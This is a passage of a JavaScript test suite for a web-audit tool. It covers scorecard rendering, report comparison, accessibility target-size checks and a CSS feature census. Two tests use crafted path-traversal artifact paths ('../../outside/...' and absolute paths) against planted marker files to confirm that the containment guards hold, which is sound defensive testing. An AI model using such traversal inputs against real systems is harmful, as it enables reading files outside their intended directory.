  const { countOutstanding, completionState, remaining } = await import('../runner/remaining-work.mjs');
  assert(countOutstanding(before) === 0 && completionState(before).blocked === 3 && completionState(before).notRun === 2,
    'remaining-work: shared module should see the partial before-run');
  assert(remaining(before).total === 5 && remaining(after).total === 1,
    'remaining-work: total should be findings + blocked + not-run');

  // web-uplift-1as: a report that claims complete coverage while recording no
  // checks has zero blocked/not-run rows, so the unconcluded line reads "0 -> 0"
  // and the comparison looks clean. Say the coverage is unaccounted instead of
  // counting nothing.
  const unaccounted = structuredClone(clean);
  unaccounted.checkOutcomes = [];
  unaccounted.coverage = { recorded: 0, judged: 0, missing: 0, complete: true };
  unaccounted.status = 'completed';
  const unaccountedMd = renderCompareMd(compareReports(unaccounted, unaccounted), { hostName: 'example.test' });
  assert(
    unaccountedMd.includes('**Coverage:**') && unaccountedMd.includes('records no checks'),
    `compare: an unaccounted report must be called out, not counted as clean:\n${unaccountedMd}`,
  );
  const completeMd = renderCompareMd(compareReports(clean, clean), { hostName: 'example.test' });
  assert(
    !completeMd.includes('**Coverage:**'),
    `compare: a complete pair must not grow a coverage caveat:\n${completeMd}`,
  );
}

async function testScorecardScoringAndRender() {
  const { scoreReport, renderScorecard, renderTextScorecard, scorecardSummary, evaluateGates, OUTCOMES } = await import('../aggregate/scorecard.mjs');
  const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));

  const scored = scoreReport(report);
  const incomplete = structuredClone(report);
  incomplete.coverage.complete = false;
  let refusedIncomplete = false;
  try { scoreReport(incomplete); } catch (error) { refusedIncomplete = /Refusing to score/.test(error.message); }
  assert(refusedIncomplete, 'scorecard: incomplete atomic coverage must be refused');
  // The 9-finding playground should not be perfect, and must not exceed 100.
  assert(typeof scored.overall === 'number', 'scorecard: overall should be numeric for the playground report');
  assert(scored.overall > 0 && scored.overall < 100, `scorecard: expected an imperfect overall, got ${scored.overall}`);
  assert(scored.outcomes.length === OUTCOMES.length, 'scorecard: every outcome should be represented');
  for (const o of scored.outcomes) {
    assert(o.score === null || (o.score >= 0 && o.score <= 100), `scorecard: ${o.key} score out of range: ${o.score}`);
  }
  // A clean report scores 100 with no findings.
  const fixed = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report-fixed.json'), 'utf8'));
  assert(scoreReport(fixed).overall === 100, 'scorecard: a findings-free report should score 100');

  // The rendered page must be self-contained and well-formed enough to open.
  report.__runId = 'r1';
  const html = renderScorecard({
    host: 'example',
    generatedAt: '2026-01-01 00:00',
    runs: [{ runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored }],
    latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
  });
  assert(html.startsWith('<!doctype html>'), 'scorecard: HTML should start with a doctype');
  assert(!html.includes('${'), 'scorecard: HTML contains an unresolved template placeholder');
  assert(!/>\s*undefined\s*</.test(html), 'scorecard: HTML contains a literal undefined');
  // Count dialogs by their generated id rather than by the bare tag name: the
  // inline script is part of this HTML, so prose that mentions a dialog element
  // must not be counted as one (a TODO comment naming tag-and-attribute once
  // unbalanced this very assertion).
  const openDialogs = (html.match(/<dialog\s+id="fd-/g) || []).length;
  const closeDialogs = (html.match(/<\/dialog>/g) || []).length;
  assert(openDialogs === closeDialogs && openDialogs >= report.findings.length, 'scorecard: dialog tags are unbalanced');

  // Finding openers are Invoker Command buttons (commandfor/command="show-modal")
  // with a support-gated imperative fallback, not fake-button list items.
  assert(html.includes('commandfor="fd-'), 'scorecard: openers must carry commandfor dialog ids');
  assert(html.includes('command="show-modal"'), 'scorecard: openers must request show-modal');
  assert(!html.includes('data-open'), 'scorecard: legacy data-open openers must be gone');
  assert(!html.includes('openFor'), 'scorecard: imperative openFor helper must be gone');
  assert(!html.includes('role="button"'), 'scorecard: fake-button roles must be gone (real buttons instead)');
  assert(html.includes("('commandForElement' in HTMLButtonElement.prototype)"), 'scorecard: fallback must be gated on commandForElement support');

  // The history chart's axis labels must not scale below the legibility floor. The CSS
  // rule is always in the page, but the CHART only renders with two or more runs, so the
  // markup assertions run against an explicit two-run render rather than against a page
  // where the chart is absent: an assertion that silently cannot apply is the vacuity
  // this guards against (the single-run fixture here is why the wrapper assertion failed
  // on its first gate run).
  assert(html.includes('.history .axis{fill:var(--muted);font-size:12px}'), 'scorecard: axis labels must use the 12px floor, not the old 10px');
  const chartHtml = renderScorecard({
    host: 'example',
    generatedAt: '2026-01-01 00:00',
    runs: [
      { runId: 'r1', dir: join(repoRoot, 'examples'), report, compare: null, ...scored, overall: 71 },
      { runId: 'r2', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
    ],
    latest: { runId: 'r2', dir: join(repoRoot, 'examples'), report, compare: null, ...scored },
  });
  assert(chartHtml.includes('class="history-scroll"'), 'scorecard: the chart needs its scroll wrapper');
  assert(chartHtml.includes('style="min-width:640px"'), 'scorecard: the chart must keep its natural width inside the scroll wrapper');
  assert(
    chartHtml.includes('role="region"') && chartHtml.includes('aria-label="Score history trend"') && chartHtml.includes('tabindex="0"'),
    'scorecard: the scroll wrapper must be keyboard focusable and named',
  );

  // Light dismiss is native via closedby="any" on each dialog, with a
  // support-gated imperative fallback for browsers without the attribute.
  assert(html.includes('closedby="any"'), 'scorecard: dialogs must request native light dismiss');
  assert(html.includes("('closedBy' in HTMLDialogElement.prototype)"), 'scorecard: the dismiss fallback must be gated on closedBy support');

  // The sticky topbar is a scroll-state query container and the stuck-state cue
  // lives on its descendant surface (a container query cannot style its own
  // container), so both halves must survive.
  assert(html.includes('container-type:scroll-state') && html.includes('container-name:topbar'), 'scorecard: the topbar must be a named scroll-state container');
  assert(html.includes('@container topbar scroll-state(stuck: top)'), 'scorecard: the stuck-state rule must query the topbar container');
  assert(html.includes('class="topbar-surface"'), 'scorecard: the topbar must keep its queryable surface element');

  // The inline text scorecard leads with the overall + a link, same numbers.
  const text = renderTextScorecard(
    { host: 'example', latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, ...scored } },
    { htmlPath: 'reports/example/scorecard.html' },
  );
  assert(text.includes(`Overall: ${scored.overall}/100`), 'scorecard text: overall line missing/mismatched');
  assert(text.includes('reports/example/scorecard.html'), 'scorecard text: HTML link missing');
  assert(text.includes('Do these first:'), 'scorecard text: top-3 section missing');

  // CI gate: machine summary + threshold evaluation.
  const data = { host: 'example', generatedAt: 'now', latest: { runId: 'r1', dir: join(repoRoot, 'examples'), report, ...scored } };
  const summary = scorecardSummary(data);
  assert(summary.overall === scored.overall, 'scorecardSummary: overall mismatch');
  assert(summary.findingsTotal === report.findings.length, 'scorecardSummary: findings total mismatch');
  assert(typeof summary.outcomes.discoverable !== 'undefined', 'scorecardSummary: outcomes map missing keys');

  // An impossible bar fails; a trivially-met bar passes.
  const fail = evaluateGates(summary, { min: {}, minOverall: 100, maxCritical: 0 });
  assert(fail.passed === false && fail.checks.some((c) => !c.ok), 'gate: overall=100 should fail an imperfect report');
  const pass = evaluateGates(summary, { min: {}, minOverall: 1, maxHigh: 999 });
  assert(pass.passed === true, 'gate: trivial thresholds should pass');
  // A not-applicable outcome never fails its gate.
  const naGate = evaluateGates({ overall: 50, outcomes: { memory: null }, findingsBySeverity: { critical: 0, high: 0 } }, { min: { memory: 90 } });
  assert(naGate.passed === true, 'gate: a null (N/A) outcome must not fail its gate');
}

// web-uplift-2zj: artifact paths in a report are untrusted input, so resolving one
// outside its run directory must not read the file, and must not be emitted as a
// relative src either. Before the fix, `join(dir, relPath)` collapsed `..` and the
// scorecard read and inlined an arbitrary image into the published HTML.
async function testScorecardArtifactContainment() {
  const { scoreReport, renderScorecard } = await import('../aggregate/scorecard.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-artifact-'));
  try {
    const runDir = join(root, 'host', 'r1');
    const prevDir = join(root, 'host', 'r0');
    const outsideDir = join(root, 'outside');
    for (const d of [runDir, prevDir, outsideDir]) mkdirSync(d, { recursive: true });

    // Distinct markers so each assertion names the exact file it is about.
    const relSecret = Buffer.from('TRAVERSAL-REL-MARKER');
    const absSecret = Buffer.from('TRAVERSAL-ABS-MARKER');
    const legitBytes = Buffer.from('LEGIT-INLINE-MARKER');
    writeFileSync(join(outsideDir, 'rel-secret.png'), relSecret);
    writeFileSync(join(outsideDir, 'abs-secret.png'), absSecret);
    writeFileSync(join(outsideDir, 'clip.mp4'), Buffer.from('outside-video'));
    writeFileSync(join(runDir, 'shot.png'), legitBytes);

    // Non-vacuity: the planted file must actually be reachable the way the old
    // unguarded `join(dir, relPath)` resolved it, or the escape assertions below
    // would pass against a fixture that could never have leaked anyway.
    assert(
      existsSync(join(runDir, '../../outside/rel-secret.png')),
      'scorecard: the traversal fixture must be reachable through a plain join, or the escape test is vacuous',
    );

    const report = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
    report.__runId = 'r1';
    const findingId = report.findings[0].id;
    report.artifacts = [
      { path: 'shot.png', type: 'screenshot', findingIds: [findingId], caption: 'legit' },
      { path: '../../outside/rel-secret.png', type: 'screenshot', findingIds: [findingId], caption: 'escape' },
      { path: join(outsideDir, 'abs-secret.png'), type: 'screenshot', findingIds: [findingId], caption: 'absolute' },
      { path: '../../outside/clip.mp4', type: 'video', findingIds: [findingId], caption: 'escape video' },
    ];
    const scored = scoreReport(report);
    const html = renderScorecard({
      host: 'example',
      generatedAt: '2026-01-01 00:00',
      runs: [{ runId: 'r1', dir: runDir, report, compare: null, ...scored }],
      latest: { runId: 'r1', dir: runDir, report, compare: null, ...scored },
    });

    // The positive control matters as much as the negative ones: a guard that
    // simply stopped inlining would pass every escape assertion below.
    assert(
      html.includes(legitBytes.toString('base64')),
      'scorecard: a contained in-run screenshot must still be inlined',
    );
    assert(
      !html.includes(relSecret.toString('base64')),
      'scorecard: a ../ artifact path must not be read and inlined',
    );
    assert(
      !html.includes(absSecret.toString('base64')),
      'scorecard: an absolute artifact path must not be read and inlined',
    );
    // The base64 check above is NOT sufficient on its own: pre-fix, `join(dir,
    // absPath)` produced a nonexistent path, so the file was never inlined and
    // the assertion passed anyway - the leak was the emitted relative URL. Assert
    // on the filename so this fails against the pre-fix code.
    assert(
      !html.includes('abs-secret.png'),
      'scorecard: an absolute artifact path must not be emitted into the HTML at all',
    );
    assert(
      !html.includes('../../outside'),
      'scorecard: an escaping artifact path must not be emitted as a relative src',
    );

    // The compare panel resolves before/after paths against OTHER run directories
    // and goes through the same read, so it needs the same containment guard.
    const cmp = {
      runA: 'r0',
      runB: 'r1',
      summary: {},
      metrics: [],
      screenshotPairs: [{ before: '../../outside/rel-secret.png', after: 'shot.png', caption: 'pair' }],
    };
    const cmpHtml = renderScorecard({
      host: 'example',
      generatedAt: '2026-01-01 00:00',
      runs: [
        { runId: 'r0', dir: prevDir, report, compare: null, ...scored },
        { runId: 'r1', dir: runDir, report, compare: cmp, ...scored },
      ],
      latest: { runId: 'r1', dir: runDir, report, compare: cmp, ...scored },
    });
    assert(
      cmpHtml.includes(legitBytes.toString('base64')),
      'scorecard: the compare panel must still inline a contained after-shot',
    );
    assert(
      !cmpHtml.includes(relSecret.toString('base64')),
      'scorecard: a ../ before/after compare path must not be read and inlined',
    );
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

// web-uplift-2zj (reviewer finding): aggregate/compare.mjs had the same
// uncontained-artifact shape as the scorecard - `resolveArtifact` fell back to a
// bare `join(dir, p)`, and it ALSO passed absolute paths straight through, so a
// report-supplied HAR path could be read from anywhere on disk. compare.md also
// emitted before/after paths verbatim.
async function testCompareArtifactContainment() {
  const { compareReports, renderCompareMd } = await import('../aggregate/compare.mjs');
  const root = mkdtempSync(join(tmpdir(), 'web-uplift-compare-'));
  try {
    const dirA = join(root, 'host', 'r0');
    const dirB = join(root, 'host', 'r1');
    const outsideDir = join(root, 'outside');
    for (const d of [dirA, dirB, outsideDir]) mkdirSync(d, { recursive: true });

    // Same 2-entry HAR inside and outside, so "was it read?" is answered by the
    // entry count alone: 2 means it was read, null means the guard refused.
    const har = { log: { entries: [{ response: { _transferSize: 100 } }, { response: { _transferSize: 200 } }] } };
    writeFileSync(join(outsideDir, 'rel-secret.har'), JSON.stringify(har));
    // diffNetwork reads the A side against dirA and the B side against dirB, so
  // the contained control has to exist in BOTH run dirs.
  writeFileSync(join(dirA, 'run.har'), JSON.stringify(har));
  writeFileSync(join(dirB, 'run.har'), JSON.stringify(har));
    writeFileSync(join(outsideDir, 'rel-secret.png'), Buffer.from('COMPARE-TRAVERSAL-MARKER'));
    writeFileSync(join(dirA, 'shot.png'), Buffer.from('COMPARE-LEGIT-MARKER'));

    const base = JSON.parse(readFileSync(join(repoRoot, 'examples/playground-report.json'), 'utf8'));
    const withArtifact = (path) => {
      const r = structuredClone(base);
      r.artifacts = [{ type: 'har', path }];
      return r;
    };
    const contained = withArtifact('run.har');
    const escaping = withArtifact('../../outside/rel-secret.har');
    const absolute = withArtifact(join(outsideDir, 'rel-secret.har'));

    // If either HAR had been read, its count would be 2. `null` on the unsafe
    // side and 2 on the contained side is the containment proof AND the positive
    // control in one assertion.
    const blocked = compareReports(escaping, contained, { dirA, dirB });
    assert(
      blocked.network?.requestCount.before === null && blocked.network?.requestCount.after === 2,
      `compare: an escaping HAR path must not be read while a contained one is (got ${JSON.stringify(blocked.network)})`,
    );
    const blockedAbs = compareReports(absolute, contained, { dirA, dirB });
    assert(
      blockedAbs.network?.requestCount.before === null,
      `compare: an absolute HAR path must not be read (got ${JSON.stringify(blockedAbs.network)})`,
    );

    // compare.md must not emit an escaping or absolute image reference.
    const cmp = {
      ...compareReports(base, base, { dirA, dirB }),
      screenshotPairs: [
        { before: '../../outside/rel-secret.png', after: join(outsideDir, 'rel-secret.png'), caption: 'escape' },
        { before: 'shot.png', after: 'shot.png', caption: 'legit' },
      ],
    };
    const md = renderCompareMd(cmp, { hostName: 'example.test', runAId: 'r0', runBId: 'r1', dirA, dirB });
    assert(!md.includes('../../outside'), 'compare.md: an escaping before/after path must not be emitted');
    assert(!md.includes(outsideDir), 'compare.md: an absolute before/after path must not be emitted');
    // Positive control: a contained path is still rendered (rewritten relative to
    // runB's dir, which is why the legitimate reference itself starts with ../).
    assert(md.includes('![before](../r0/shot.png)'), `compare.md: a contained before path must still be emitted:\n${md}`);
    assert(md.includes('![after](shot.png)'), 'compare.md: a contained after path must still be emitted');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

async function testDiscoverabilityHelpers() {
  const { stripHtmlToText, contentTokens, detectEmptyMounts, contentPresentInRaw } = await import('../evidence/cli.mjs');

  // stripHtmlToText drops scripts/styles/markup, keeps visible text.
  const text = stripHtmlToText('<html><head><style>.x{color:red}</style></head><body><h1>Hello There</h1><script>var a=1</script><p>Body &amp; content</p></body></html>');
  assert(text.includes('Hello There') && text.includes('Body & content'), `stripHtmlToText missed content: ${text}`);
  assert(!text.includes('color:red') && !text.includes('var a'), `stripHtmlToText leaked script/style: ${text}`);

  // contentTokens keeps >=4-char words, lowercased, de-duped.
  const toks = contentTokens('The Thylakoid MEMBRANE membrane a to');
  assert(toks.has('thylakoid') && toks.has('membrane'), 'contentTokens missing expected words');
  assert(!toks.has('the') && !toks.has('to'), 'contentTokens should skip short words');
  assert(toks.size === 2, `contentTokens should de-dupe case-insensitively, got ${toks.size}`);

  // detectEmptyMounts flags an empty SPA root but not a filled one.
  assert(detectEmptyMounts('<div id="root"></div>').includes('#root'), 'should detect empty #root');
  assert(detectEmptyMounts('<div id="root"><h1>hi</h1></div>').length === 0, 'should not flag a filled #root');
  assert(detectEmptyMounts('<div id="__next">   </div>').includes('#__next'), 'should detect empty #__next');

  // contentPresentInRaw: inline markup and line breaks must not hide a
  // server-rendered h1/title (web-uplift-406). innerText collapses them, so the
  // verbatim-substring compare reported the h1 of paul.kinlan.me as missing.
  const rawFixture = stripHtmlToText('<html><head><title>Hello. I am Paul Kinlan.</title></head><body><h1 class="x">\n          Hello. I am <span class="fn">Paul Kinlan</span>.\n        </h1></body></html>');
  assert(contentPresentInRaw('Hello. I am Paul Kinlan.', rawFixture), `inline-span h1 should be present in raw text: ${rawFixture}`);
  assert(contentPresentInRaw('Hello. I am\n          Paul Kinlan.', rawFixture), 'a rendered value with line breaks should still match');
  assert(!contentPresentInRaw('Client Injected Heading', rawFixture), 'a JS-only heading must not read as present');
  assert(!contentPresentInRaw('', rawFixture) && !contentPresentInRaw(null, rawFixture), 'empty values are not present');
  // A value with no >=4-char tokens still compares, so it is not present by default.
  assert(contentPresentInRaw('Hi', '<p>Hi there</p>'), 'short text should be found when present');
  assert(!contentPresentInRaw('Hi', '<p>Bye there</p>'), 'short text should not be found when absent');
}

// End to end, through the real primitive: a server-rendered h1 broken up by an
// inline span and line breaks must report h1PresentInRaw true (the paul.kinlan.me
// shape, web-uplift-406), and an h1 that only JavaScript inserts must stay false,
// so the fix cannot be paid for by weakening the shell detection.
async function testDiscoverabilityH1InRaw() {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if ((req.url || '').startsWith('/markup')) {
      res.end('<!doctype html><html><head><title>Inline markup</title></head><body>' +
        '<h1 class="page-title">\n          Hello. I am <span class="fn">Paul Kinlan</span>.\n        </h1>' +
        '<p>A server-rendered paragraph with enough words for the coverage measure to compare.</p>' +
        '</body></html>');
      return;
    }
    res.end('<!doctype html><html><head><title>Client rendered</title></head><body>' +
      '<div id="app"></div>' +
      '<p>A server-rendered paragraph with enough words for the coverage measure to compare.</p>' +
      '<script>document.querySelector("#app").innerHTML = "<h1>Client Injected Heading</h1>";</script>' +
      '</body></html>');
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const markup = await gather('discoverability', `${base}/markup`, { quiet: true, wait: 0, screenshots: false });
    assert(markup.rendered.h1Count === 1, `discoverability: expected the rendered h1: ${JSON.stringify(markup.rendered)}`);
    assert(
      markup.h1PresentInRaw === true,
      `discoverability: an inline-span h1 was reported missing from the raw HTML: ${JSON.stringify(markup.rendered)}`,
    );

    const injected = await gather('discoverability', `${base}/client`, { quiet: true, wait: 0, screenshots: false });
    assert(injected.rendered.h1Count === 1, `discoverability: expected the JS-injected h1: ${JSON.stringify(injected.rendered)}`);
    assert(
      injected.h1PresentInRaw === false,
      `discoverability: a JS-injected h1 read as present in the raw HTML: ${JSON.stringify(injected.rendered)}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// WCAG 2.2 SC 2.5.8 Target Size (Minimum) needs real geometry: the targets
// primitive enumerates pointer targets, flags anything under 24x24 CSS px, marks
// the inline-in-text and spacing exceptions it can read from geometry, and
// measures a desktop and a narrow layout by default (web-uplift-uz7).
async function testTargetsPrimitive() {
  const page = [
    '<!doctype html><html><head><title>targets</title><style>',
    '  body { margin: 0; }',
    '  .tiny { width: 16px; height: 16px; padding: 0; border: 0; }',
    '  .big { width: 48px; height: 48px; }',
    '  .gap { margin-left: 200px; }',
    '  section, p { margin-bottom: 40px; }',
    '  p { font-size: 16px; line-height: 20px; }',
    '</style></head><body>',
    '<p>Read the <a class="tiny" href="#a" id="inline-link">text</a> in this sentence.</p>',
    '<section><button class="tiny" id="tight-a">a</button><button class="tiny" id="tight-b">b</button></section>',
    '<section><button class="tiny" id="spaced-a">a</button><button class="tiny gap" id="spaced-b">b</button></section>',
    '<section><button class="big" id="big-button">ok</button></section>',
    '<section><span style="display:none">hidden</span><a href="#z" style="width:0;height:0"></a></section>',
    '</body></html>',
  ].join('\n');
  const many = '<!doctype html><html><head><title>many</title><style>a{display:inline-block;width:8px;height:8px}</style></head><body>' +
    Array.from({ length: 420 }, (_, i) => `<a href="#${i}">${i}</a>`).join('') +
    '</body></html>';
  const empty = '<!doctype html><html><head><title>empty</title></head><body><p>No pointer targets at all here.</p></body></html>';

  const server = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    if (path === '/many') res.end(many);
    else if (path === '/empty') res.end(empty);
    else res.end(page);
  });

  await new Promise((resolveListen) => server.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = server.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('targets', `${base}/page`, { quiet: true, wait: 250 });
    assert(result.minimumPx === 24, `targets: minimum should be 24 CSS px: ${result.minimumPx}`);
    assert(result.viewports.length === 2, `targets: expected a desktop and a narrow pass by default: ${result.viewports.length}`);
    const [desktop, narrow] = result.viewports;
    assert(
      desktop.name === 'desktop-1280x720' && desktop.viewport.width === 1280 && desktop.viewport.height === 720,
      `targets: the desktop pass did not measure a 1280x720 layout: ${JSON.stringify(desktop.viewport)}`,
    );
    assert(
      narrow.name === 'narrow-360x800' && narrow.viewport.width === 360 && narrow.viewport.height === 800,
      `targets: the narrow pass did not measure a 360x800 layout: ${JSON.stringify(narrow.viewport)}`,
    );

    const byId = new Map(desktop.targets.map((t) => [t.id, t]));
    const inline = byId.get('inline-link');
    assert(
      inline?.underMin === true && inline.inlineInText === true,
      `targets: an undersized link in a sentence should be flagged and marked inline-exempt: ${JSON.stringify(inline)}`,
    );
    for (const id of ['tight-a', 'tight-b']) {
      const t = byId.get(id);
      assert(
        t?.underMin === true && t.inlineInText === false && t.spacingPasses === false,
        `targets: ${id} is undersized with no spacing clearance and should say so: ${JSON.stringify(t)}`,
      );
    }
    for (const id of ['spaced-a', 'spaced-b']) {
      const t = byId.get(id);
      assert(
        t?.underMin === true && t.spacingPasses === true,
        `targets: ${id} is undersized but clears its neighbours and should say so: ${JSON.stringify(t)}`,
      );
    }
    const big = byId.get('big-button');
    assert(
      big?.underMin === false && big.spacingPasses === null,
      `targets: a 48x48 button is not undersized: ${JSON.stringify(big)}`,
    );
    assert(desktop.skippedZeroSizeCount === 1, `targets: the zero-size target should be skipped: ${desktop.skippedZeroSizeCount}`);
    assert(
      desktop.underMinCount === 5 &&
        desktop.underMinInlineExemptCount === 1 &&
        desktop.underMinSpacingExemptCount === 3 &&
        desktop.underMinNoKnownExemptionCount === 2,
      `targets: summary counts do not match the inventory: ${JSON.stringify({ underMin: desktop.underMinCount, inline: desktop.underMinInlineExemptCount, spacing: desktop.underMinSpacingExemptCount, none: desktop.underMinNoKnownExemptionCount })}`,
    );
    assert(
      narrow.underMinNoKnownExemptionCount === 2,
      `targets: the narrow pass should reach the same verdict on this fixture: ${narrow.underMinNoKnownExemptionCount}`,
    );

    // An explicit --viewport means one pass, and the inventory is capped with the
    // cap reported rather than silently trimmed.
    const manyResult = await gather('targets', `${base}/many`, { quiet: true, wait: 200, viewport: { w: 360, h: 800 } });
    assert(manyResult.viewports.length === 1, `targets: an explicit viewport should give one pass: ${manyResult.viewports.length}`);
    const capped = manyResult.viewports[0];
    assert(
      capped.matchedCount === 420 && capped.measuredCount === 400 && capped.omittedByCapCount === 20,
      `targets: the target cap was not reported: ${JSON.stringify({ matched: capped.matchedCount, measured: capped.measuredCount, omitted: capped.omittedByCapCount })}`,
    );
    assert(
      capped.underMinCount === 400 && capped.underMinNoKnownExemptionCount === 400,
      `targets: a wall of adjacent 8x8 links has no read exemption: ${JSON.stringify({ underMin: capped.underMinCount, noExemption: capped.underMinNoKnownExemptionCount })}`,
    );

    // No targets is a clean zero result, not an absent field: that is the
    // evidence a no-target page needs for the check to pass.
    const emptyResult = await gather('targets', `${base}/empty`, { quiet: true, wait: 200, viewport: { w: 360, h: 800 } });
    const none = emptyResult.viewports[0];
    assert(
      none.measuredCount === 0 && none.underMinNoKnownExemptionCount === 0 && none.targets.length === 0,
      `targets: a page with no targets should report zeroes: ${JSON.stringify({ measured: none.measuredCount, noExemption: none.underMinNoKnownExemptionCount })}`,
    );
  } finally {
    await new Promise((resolveClose) => server.close(resolveClose));
  }
}

// The checks that turn on which modern CSS a page actually ships need the LIVE
// CSSOM, not a grep of the dom primitive's capped css string. This fixture
// covers every census source (document sheet with @import/@layer/@container/
// @starting-style/@scope/@supports/@property, a cross-origin sheet that must be
// skipped rather than crash the walk, a shadow-root adopted sheet, inline
// styles), the tracked feature rows, the overlay census, and the condition cap
// (web-uplift-xci).
async function testFeaturesPrimitive() {
  // The cross-origin sheet has to be a different origin, and a different port
  // is a different origin, so a second server is the cheapest honest fixture.
  const cross = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/css' });
    res.end('.cross { color: orange; }');
  });
  await new Promise((resolveListen) => cross.listen(0, '127.0.0.1', resolveListen));
  const crossPort = cross.address().port;

  const css = [
    '@layer base, theme;',
    '@layer base { .a { color: light-dark(#111, #eee); } }',
    '@media (prefers-color-scheme: dark) { .a { color-scheme: dark; } }',
    '@container card (min-width: 300px) { .b { color: red; } }',
    '@starting-style { .c { opacity: 0; } }',
    '@scope (.scope-root) { .d { color: blue; } }',
    '@supports (color: light-dark(black, white)) { .e { color: light-dark(black, white); } }',
    '.f { container-type: inline-size; container-name: card; anchor-name: --a; position-try: --t; text-wrap: balance; }',
    '.g:has(> .h) { color: green; }',
    'dialog::backdrop { background: rgb(0 0 0 / 0.5); }',
    '.pop:popover-open { color: purple; }',
    '@keyframes fade { from { opacity: 0; } to { opacity: 1; } }',
    "@property --my-prop { syntax: '<length>'; inherits: false; initial-value: 0px; }",
    ':root { --brand: #123; --space: 4px; }',
  ].join('\n');
  const manyConditions = Array.from({ length: 70 }, (_, i) => `@media (min-width: ${100 + i}px) { .m${i} { color: red; } }`).join('\n');

  const page = (many) => [
    '<!doctype html><html><head><title>features</title>',
    ...(many ? [] : [`<link rel="stylesheet" href="http://127.0.0.1:${crossPort}/cross.css">`]),
    '<style>',
    "@import url('/imported.css');",
    many ? manyConditions : css,
    '</style></head><body>',
    '<div class="scope-root"><p class="d">scoped</p></div>',
    '<dialog open>native dialog</dialog>',
    '<div popover id="pop">popover</div>',
    '<details><summary>more</summary>body</details>',
    '<div role="dialog" aria-modal="true">div dialog</div>',
    '<div id="stack" style="position:fixed;z-index:60">stacked</div>',
    '<div id="inline" style="container-type:inline-size">inline container</div>',
    '<div id="host"></div>',
    '<script>',
    "  const root = document.getElementById('host').attachShadow({ mode: 'open' });",
    '  const sheet = new CSSStyleSheet();',
    "  sheet.replaceSync('.shadowed { interpolate-size: allow-keywords; }');",
    '  root.adoptedStyleSheets = [sheet];',
    "  root.innerHTML = '<span class=\"shadowed\">shadow</span>';",
    '</script>',
    '</body></html>',
  ].join('\n');

  const main = http.createServer((req, res) => {
    const path = (req.url || '').split('?')[0];
    if (path === '/imported.css') {
      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.end('.imported { animation-timeline: --t; }');
      return;
    }
    if (path === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(page(path === '/many'));
  });

  await new Promise((resolveListen) => main.listen(0, '127.0.0.1', resolveListen));
  try {
    const { port } = main.address();
    const base = `http://127.0.0.1:${port}`;

    const result = await gather('features', `${base}/`, { quiet: true, wait: 600 });

    // Every style source is visited, and the unreadable one is counted, named,
    // and makes the census explicitly partial rather than silently thin.
    assert(result.censusComplete === false, `features: a cross-origin sheet must make the census incomplete: ${result.censusComplete}`);
    assert(result.sheets.crossOriginSkipped === 1, `features: the cross-origin sheet should be skipped and counted: ${JSON.stringify(result.sheets)}`);
    assert(
      result.sheets.crossOriginSheetUrls.some((u) => u.includes('/cross.css')),
      `features: the skipped sheet should be named so it can be checked another way: ${JSON.stringify(result.sheets.crossOriginSheetUrls)}`,
    );
    assert(result.sheets.importedSheetsFollowed === 1, `features: the @import sheet should be followed: ${JSON.stringify(result.sheets)}`);
    assert(result.sheets.shadowRootsScanned === 1, `features: the shadow root should be scanned: ${JSON.stringify(result.sheets)}`);
    assert(result.sheets.inlineStyleElements === 2, `features: both inline styles should be scanned: ${JSON.stringify(result.sheets)}`);

    const atRules = result.tracked.atRules;
    assert(
      atRules['@container'] === 1 && atRules['@starting-style'] === 1 && atRules['@scope'] === 1 &&
        atRules['@supports'] === 1 && atRules['@property'] === 1 && atRules['@layer'] === 2 && atRules['@view-transition'] === 0,
      `features: at-rule census is wrong: ${JSON.stringify(atRules)}`,
    );
    const props = result.tracked.properties;
    assert(
      props['container-type'] >= 2 && props['anchor-name'] === 1 && props['position-try-fallbacks'] === 1 &&
        props['animation-timeline'] === 1 && props['interpolate-size'] === 1 && props['color-scheme'] === 1 &&
        props['content-visibility'] === 0,
      `features: property census is wrong: ${JSON.stringify(props)}`,
    );
    assert(result.tracked.functions['light-dark'] >= 2, `features: light-dark() usage was not counted: ${JSON.stringify(result.tracked.functions)}`);
    const sels = result.tracked.selectors;
    assert(
      sels[':has('] === 1 && sels['::backdrop'] === 1 && sels[':popover-open'] === 1 && sels[':is('] === 0,
      `features: selector census is wrong: ${JSON.stringify(sels)}`,
    );
    assert(result.customProperties.distinct === 2, `features: custom properties were not counted: ${JSON.stringify(result.customProperties)}`);
    const conditionNames = Object.keys(result.conditions);
    assert(
      conditionNames.includes('@media (prefers-color-scheme: dark)') && conditionNames.some((c) => c.startsWith('@container card')),
      `features: conditional at-rule preludes should be in the census: ${JSON.stringify(conditionNames)}`,
    );

    const overlays = result.overlays;
    assert(
      overlays.dialogElements === 1 && overlays.openDialogs === 1 && overlays.popoverElements === 1 &&
        overlays.detailsElements === 1 && overlays.roleDialogElements === 1 && overlays.ariaModalElements === 1,
      `features: overlay census is wrong: ${JSON.stringify(overlays)}`,
    );
    assert(
      overlays.highZIndexCount === 1 && overlays.highZIndexMax === 60 && overlays.highZIndexExamples[0]?.id === 'stack',
      `features: the high z-index div was not surfaced: ${JSON.stringify(overlays)}`,
    );

